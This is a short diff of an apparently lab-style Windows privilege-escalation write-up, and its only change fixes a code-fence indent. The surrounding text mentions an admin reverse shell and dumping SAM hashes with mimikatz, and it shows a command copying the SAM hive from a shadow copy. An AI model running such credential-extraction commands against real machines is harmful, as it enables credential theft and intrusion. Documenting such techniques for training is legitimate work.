@@ -194,7 +194,7 @@ nt authority\system
    
 After starting we will get a rev shell with admin privileges, lets dump the SAM hashes using mimikaza,   
   First we will copy the SAM SYSTEM and SECURITY file.   
-  ```
+```
 C:\PrivEsc>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\PrivEsc\SAM
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\PrivEsc\SAM
         1 file(s) copied.
